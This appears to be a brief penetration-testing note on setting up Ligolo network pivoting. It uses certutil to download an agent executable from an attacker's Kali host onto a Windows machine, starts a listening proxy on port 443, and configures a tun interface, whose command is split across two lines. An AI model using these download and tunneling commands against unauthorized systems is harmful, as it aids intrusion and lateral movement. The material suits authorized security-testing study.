Transfer ligolo agent to windows machine

```
certutil -urlcache -f http://kali-ip-address/agent.exe agent.exe
```

Setup proxy (specifying port):

```
./lin_proxy -selfcert -laddr 0.0.0.0:443
```

OR.. without specifying port:

```
./lin_proxy -selfcert
```

```
sudo ip tuntap add user kali
mode tun ligolo
sudo ip link set ligolo up
```
